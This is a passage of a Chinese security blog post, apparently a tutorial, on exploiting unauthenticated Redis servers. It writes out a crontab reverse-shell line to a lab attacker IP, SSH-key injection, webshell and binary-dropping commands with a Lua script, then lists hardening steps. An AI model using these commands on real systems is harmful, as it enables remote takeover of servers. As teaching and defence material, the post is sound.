@@ -1,0 +1,1525 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 Redis未授权访问1.扫描探测(1). 测试时建议 vim &#x2F;etc&#x2F;redis.conf 1234（1）cp redis.conf .&#x2F;src&#x2F;redis.conf    （2）bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0    （3）protected-mode设为no    （4）启动redis-server  ------&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某些服务未授权访问漏洞">
+<meta property="og:url" content="http://alin.run/2020/07/20/%E6%9F%90%E4%BA%9B%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="alin&#39;Blog">
+<meta property="og:description" content="0x01 Redis未授权访问1.扫描探测(1). 测试时建议 vim &#x2F;etc&#x2F;redis.conf 1234（1）cp redis.conf .&#x2F;src&#x2F;redis.conf    （2）bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0    （3）protected-mode设为no    （4）启动redis-server  ------&amp;g">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7fd90ipj31e10u04qp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7frjaewj319r0u0x4r.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b02a29da-5195-1.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7gz4d41j315209gq4i.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b05af56a-5195-1.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7hyaw1gj31db0u04gf.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7iw12uij313z0d4niy.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jao333j31bw0u04fi.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jn8iu2j31um0lywnq.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7jyzv9ej31bw0u0wvu.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7khfjehj31vc0mcwlw.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7l049boj31ry0qgwri.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7lp6avzj31ze0tmwt3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7mj6ag6j31bw0u07wh.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7n3llvmj31s90u0hdt.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7nh31zzj30xj0kln2k.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ns7c1hj31gx0q1n1z.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7qn8be1j31l70u0u0x.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ri7ikpj31it0u0kjn.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7rwv08mj31th0u0qv5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7t0lki6j31yh0sbx6q.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7t9vlvxj31jl0u01kx.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7tmj9xnj31uc0t64qp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7tw45o0j31e10u0e4c.jpg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-b993fcbc-5195-1.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ud5stsj31jo0u0b29.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7uy0e3bj31ua0u0u0x.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7vwdk3vj31uc0t64qp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7w7fikvj31e10u0b29.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7wr6bjwj31q40u0npe.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7yk1kmej31k60cwtan.jpg">
+<meta property="article:published_time" content="2020-07-20T01:34:42.000Z">
+<meta property="article:modified_time" content="2020-07-20T02:17:29.700Z">
+<meta property="article:author" content="alin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7fd90ipj31e10u04qp.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://alin.run/2020/07/20/某些服务未授权访问漏洞/"/>
+
+
+
+
+
+  <title>某些服务未授权访问漏洞 | alin'Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5e6a61cde714ee04a36217a052cbca33";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">alin'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alin.run/2020/07/20/%E6%9F%90%E4%BA%9B%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="alin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/mao.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="alin'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">某些服务未授权访问漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-20T09:34:42+08:00">
+                2020-07-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-Redis未授权访问"><a href="#0x01-Redis未授权访问" class="headerlink" title="0x01 Redis未授权访问"></a>0x01 Redis未授权访问</h2><h4 id="1-扫描探测"><a href="#1-扫描探测" class="headerlink" title="1.扫描探测"></a>1.扫描探测</h4><p><strong>(1). 测试时建议 vim /etc/redis.conf</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）cp redis.conf .&#x2F;src&#x2F;redis.conf</span><br><span class="line">    （2）bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0</span><br><span class="line">    （3）protected-mode设为no</span><br><span class="line">    （4）启动redis-server  ------&gt;   .&#x2F;src&#x2F;redis-server redis.conf</span><br></pre></td></tr></table></figure>
+
+<p><strong>(2). 攻击者喜欢的命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（1）查看信息：info</span><br><span class="line">    （2）删除所有数据库内容：flushall</span><br><span class="line">    （3）刷新数据库：flushdb</span><br><span class="line">    （4）看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">    （5）设置变量：set test &quot;who am i&quot;</span><br><span class="line">    （6）config set dir dirpath 设置路径等配置</span><br><span class="line">    （7）config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">    （8）save保存</span><br><span class="line">    （9）get 变量，查看变量名称</span><br></pre></td></tr></table></figure>
+
+<p><strong>(3). msf下利用模块</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;redis&#x2F;file_upload </span><br><span class="line">    auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_login</span><br><span class="line">    auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_server</span><br></pre></td></tr></table></figure>
+
+<p><strong>(4). nmap及获取信息</strong><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7fd90ipj31e10u04qp.jpg" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7frjaewj319r0u0x4r.jpg" alt="img"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b02a29da-5195-1.png" alt="img"></p>
+<p>匿名扫描脚本:<a href="https://xz.aliyun.com/t/528" target="_blank" rel="noopener">https://xz.aliyun.com/t/528</a></p>
+<h4 id="2-攻击的几种方法"><a href="#2-攻击的几种方法" class="headerlink" title="2.攻击的几种方法"></a><strong>2.攻击的几种方法</strong></h4><p>参考:<br><a href="http://www.cnblogs.com/xiaozi/p/7568272.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaozi/p/7568272.html</a><br><a href="https://evi1cg.me/archives/hackredis.html" target="_blank" rel="noopener">https://evi1cg.me/archives/hackredis.html</a></p>
+<p><strong>(1).利用计划任务执行命令反弹shell</strong></p>
+<p>在redis以root权限运行时可以写crontab来执行命令反弹shell<br>先在自己的服务器上监听一个端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7999</span><br></pre></td></tr></table></figure>
+
+<p>然后执行命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~## redis-cli -h 192.168.63.130</span><br><span class="line">      192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.63.128&#x2F;7999 0&gt;&amp;1\n&quot;</span><br><span class="line">      192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">      192.168.63.130:6379&gt; config set dbfilename root</span><br><span class="line">      192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p>ps:此处使用bash反弹shell，也可使用其他方法<br><strong>(2).写ssh-keygen公钥然后使用私钥登陆</strong></p>
+<p>在以下条件下，可以利用此方法</p>
+<p>1、Redis服务使用ROOT账号启动</p>
+<p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。<br>首先在本地生成一对密钥：<br><code>root@kali:~/.ssh## ssh-keygen -t rsa</code></p>
+<p>然后redis执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h x.x.x.x -x set crackit</span><br><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">     &gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">     &gt; config get dir</span><br><span class="line">     &gt; config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">     &gt; save</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></table></figure>
+
+<p>或者如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2&#x2F;XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv&#x2F;RE&#x2F;eHYgoav&#x2F;k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG&#x2F;d4TwrIj1sRz4&#x2F;GeiWG6BZ8uQND9G+Vqbx&#x2F;+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b&#x2F;ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX&#x2F;GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p><strong>(3).往web物理路径写webshell</strong></p>
+<p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">      192.168.63.130:6379&gt; config set dbfilename shell.php</span><br><span class="line">      192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">      192.168.63.130:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p>即可将shell写入web目录(web目录根据实际情况</p>
+<p><strong>(4).写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</strong><br>From:<a href="http://www.00theway.org/2017/03/27/redis_exp/" target="_blank" rel="noopener">http://www.00theway.org/2017/03/27/redis_exp/</a><br>写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">local function hex2bin(hexstr)</span><br><span class="line">    local str &#x3D; &quot;&quot;</span><br><span class="line">    for i &#x3D; 1, string.len(hexstr) - 1, 2 do</span><br><span class="line">        local doublebytestr &#x3D; string.sub(hexstr, i, i+1);</span><br><span class="line">        local n &#x3D; tonumber(doublebytestr, 16);</span><br><span class="line">        if 0 &#x3D;&#x3D; n then</span><br><span class="line">            str &#x3D; str .. &#39;\00&#39;</span><br><span class="line">        else</span><br><span class="line">            str &#x3D; str .. string.format(&quot;%c&quot;, n)</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    return str</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">local dir &#x3D; redis.call(&#39;config&#39;,&#39;get&#39;,&#39;dir&#39;)</span><br><span class="line">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;dir&#39;,&#39;&#x2F;tmp&#x2F;&#39;)</span><br><span class="line">local dbfilename &#x3D; redis.call(&#39;config&#39;,&#39;get&#39;,&#39;dbfilename&#39;)</span><br><span class="line">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;dbfilename&#39;,&#39;t&#39;)</span><br><span class="line">local rdbcompress &#x3D; redis.call(&#39;config&#39;,&#39;get&#39;,&#39;rdbcompression&#39;)</span><br><span class="line">redis.call(&#39;config&#39;,&#39;set&#39;,&#39;rdbcompression&#39;,&#39;no&#39;)</span><br><span class="line">redis.call(&#39;flushall&#39;)</span><br><span class="line"></span><br><span class="line">local data &#x3D; &#39;1a2b3c4d5e6f1223344556677890aa&#39;</span><br><span class="line">redis.call(&#39;set&#39;,&#39;data&#39;,hex2bin(&#39;0a7c7c7c&#39;..data..&#39;7c7c7c0a&#39;))</span><br><span class="line">local rst &#x3D; &#123;&#125;</span><br><span class="line">rst[1] &#x3D; &#39;server default config&#39;</span><br><span class="line">rst[2] &#x3D; &#39;dir:&#39;..dir[2]</span><br><span class="line">rst[3] &#x3D; &#39;dbfilename:&#39;..dbfilename[2]</span><br><span class="line">rst[4] &#x3D; &#39;rdbcompression:&#39;..rdbcompress[2]</span><br><span class="line">return rst</span><br><span class="line">保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行</span><br></pre></td></tr></table></figure>
+
+<p><code>redis-cli --eval a.lua -h *.*.*.*</code><br>由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli save -h *.*.*.*</span><br><span class="line">redis-cli config set dir *** -h *.*.*.*</span><br><span class="line">redis-cli config set dbfilename *** -h *.*.*.*</span><br><span class="line">redis-cli config set rdbcompression * -h *.*.*.*</span><br></pre></td></tr></table></figure>
+
+<p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了<code>|||</code>作为提取最终文件的标识）。</p>
+<p><code>*/1 * * * * python -c &#39;open(&quot;/tmp/rst&quot;,&quot;a+&quot;).write(open(&quot;/tmp/t&quot;).read().split(&quot;|||&quot;)[1])&#39;</code><br>/tmp/rst为最终上传的文件。</p>
+<p><strong>(5).傻瓜式python脚本</strong><br>From:<a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line">需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。</span><br><span class="line">    python redis_exp.py --host *.*.*.* -c &#39;id&#39;</span><br><span class="line"></span><br><span class="line">上传文件</span><br><span class="line">上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据</span><br><span class="line">    python redis_exp.py --host *.*.*.* -l &#x2F;data&#x2F;payload.py -r &#x2F;tmp&#x2F;p.py</span><br><span class="line"></span><br><span class="line">暴力猜解目录</span><br><span class="line">不需要root权限，利用 config set dir &#39;xx&#39; 报错进行目录猜解</span><br><span class="line">    python redis_exp.py --host *.*.*.* -f p.txt</span><br><span class="line"></span><br><span class="line">可以通过-p参数更改默认端口，-t参数更改等待时间</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7gz4d41j315209gq4i.jpg" alt="img"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092638-b05af56a-5195-1.png" alt="img"></p>
+<p><strong>(6).批量验证</strong><br>From:<a href="https://github.com/Ridter/hackredis" target="_blank" rel="noopener">https://github.com/Ridter/hackredis</a></p>
+<h4 id="3-防护措施"><a href="#3-防护措施" class="headerlink" title="3.防护措施"></a><strong>3.防护措施</strong></h4><p><strong>1.禁止一些高危命令</strong></p>
+<p>修改 redis.conf 文件，添加以下内容，来禁用远程修改 DB 文件地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">      rename-command CONFIG   &quot;&quot;</span><br><span class="line">      rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.以低权限运行 Redis 服务</strong></p>
+<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br><code>$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</code><br><strong>3.为 Redis 添加密码验证</strong></p>
+<p>修改 redis.conf 文件，添加<br><code>requirepass mypassword</code><br><strong>4.禁止外网访问 Redis</strong></p>
+<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br><code>bind 127.0.0.1</code><br><strong>5.保证 authorized_keys 文件的安全</strong></p>
+<p>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br><code>## chmod 400 ~/.ssh/authorized_keys</code></p>
+<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br><code>## chattr +i ~/.ssh/authorized_keys</code></p>
+<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br><code>## chattr +i ~/.ssh</code></p>
+<p>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。<br><strong>6.修改默认端口</strong></p>
+<p>指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字<br><code>## redis-server --port 6380</code></p>
+<p><strong>7.防火墙</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 6379 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 6379 -j DROP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure>
+
